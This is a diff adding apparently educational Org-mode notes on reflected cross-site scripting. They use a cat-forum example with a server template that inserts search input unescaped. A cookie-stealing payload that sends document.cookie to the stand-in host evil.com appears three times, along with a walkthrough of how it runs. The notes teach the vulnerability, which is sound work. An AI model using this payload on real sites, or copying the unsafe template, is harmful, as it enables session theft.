@@ -1,0 +1,110 @@
+#+TITLE: Reflected XSS
+#+AUTHOR: Zach Roof
+* Ep-4: What is XSS
+** Table Of Contents
+- [[#ep-4-what-is-xss][Ep-4: What is XSS]]
+  - [[#scope][Scope]]
+  - [[#reflected-xss-ex-scenario][Reflected XSS Ex: Scenario]]
+  - [[#reflected-xss-ex-search-results-view][Reflected XSS Ex: Search Results View]]
+  - [[#reflected-xss-ex-back-end-code][Reflected XSS Ex: Back-end Code]]
+  - [[#reflected-xss-ex-payload][Reflected XSS Ex: Payload]]
+  - [[#reflected-xss-ex-payload-eval-order][Reflected XSS Ex: Payload Eval Order]]
+  - [[#reflected-xss-ex-live-ex][Reflected XSS Ex: Live Ex]]
+  - [[#reflected-xss-summation][Reflected XSS Summation]]
+  - [[#xss-types][XSS Types]]
+  - [[#additional-resources][Additional Resources]]
+  - [[#error-log][Error Log]]
+  - [[#knowledge-dependency-tree][Knowledge Dependency Tree]]
+
+** Scope
+- Questions to be answered
+  - What is Reflected XSS (Cross-Site Scripting)?
+  - How does Reflected XSS compare to other types of XSS?
+  - What does a Reflected XSS payload look like?
+- 80/20 Analysis
+** Reflected XSS Ex: Scenario
+- Explore definition through example
+- Scenario
+  - Website forum for cat lovers
+  - User just clicked on a link to show all cat photos on site
+** Reflected XSS Ex: Search Results View
+- Browser Request
+  - [[http://cats.example.com?search=cat-photos]]
+- Server Response
+  #+BEGIN_SRC html
+    <!-- Search form... -->
+    <input id='search' type='text' value='cat-photos'>
+    <button>Search</button>
+    <!-- Search form... -->
+  #+END_SRC
+- Problems?
+  - Alert: User submitted input is /reflected/ into the response
+    - /Reflected/ XSS
+  - "But wait, how is this untrusted?!"
+    - We'll explore this soon
+
+** Reflected XSS Ex: Back-end Code
+- Portion of Server-side Template
+  #+BEGIN_SRC javascript
+    let searchParam = "cat-photos"; // Mock params from request
+    let htmlPage = `<input id='search' type='text' value='${searchParam}'>`;
+  #+END_SRC
+- Alert
+  - User input isn't validated against a whitelist
+  - Using string concatenation with user input
+
+** Reflected XSS Ex: Payload
+- Url View with payload
+  #+BEGIN_SRC http
+    http://cats.example.com?search='><script>document.location='http://evil.com/receiver?cookie='+document.cookie</script>
+  #+END_SRC
+
+- Server-side Template View
+  #+BEGIN_SRC javascript
+    let htmlPage = `<input id='search' type='text' value='${searchParam}'>`;
+  #+END_SRC
+
+- HTML View
+  #+BEGIN_SRC html
+    <input id='search' type='text' value=''>
+    <script>document.location='http://evil.com/receiver?cookie='+document.cookie</script>'>
+  #+END_SRC
+
+** Reflected XSS Ex: Payload Eval Order
+#+BEGIN_SRC html
+  <script>document.location='http://evil.com/receiver?cookie='+document.cookie</script>'>
+#+END_SRC
+- Eval order
+  1. document.cookie
+     - A string containing a semicolon-separated list of all cookies (i.e.
+       key=value pairs)
+  2. document.location
+     - Redirection logic
+  3. evil.com can view submitted cookie string
+
+** Reflected XSS Ex: Live Ex
+
+** Reflected XSS Summation
+- Process recap
+  1. A victim clicks on a link with the payload
+     - trusted.example.com/PAYLOAD_HERE
+  2. The payload goes to trusted.example.com
+  3. The payload is embedded in the response
+     - The payload is /reflected/ back to the user
+  4. Malicious javascript sends ~trusted.example.com~'s cookies to ~evil.example.com~
+- Attack vectors
+  - Payload at the end of a long link
+    - When previewing a link, only first x characters are easily viewable
+  - Link shortener
+
+** XSS Types
+- Persistent
+  - Stored XSS
+- Non-Persistent
+  - Reflected XSS
+  - DOM XSS
+
+** Additional Resources
+** Error Log
+:PROPERTIES:
+** Knowledge Dependency Tree
